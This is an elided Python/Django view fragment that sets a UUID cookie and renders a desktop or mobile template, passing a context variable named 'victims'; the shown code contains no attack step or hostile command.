...
def index(request):
    ...
    if 'uuid' not in request.COOKIES:
        ...
        response = render(request,'index.html') if AGENT.is_pc else render(request,'mobix.html')
        UUID = uuid.uuid1().hex
        ...
        response = render(request,'index.html',{'victims':victims}) if AGENT.is_pc else render(request,'mobix.html',{'victims':victims})
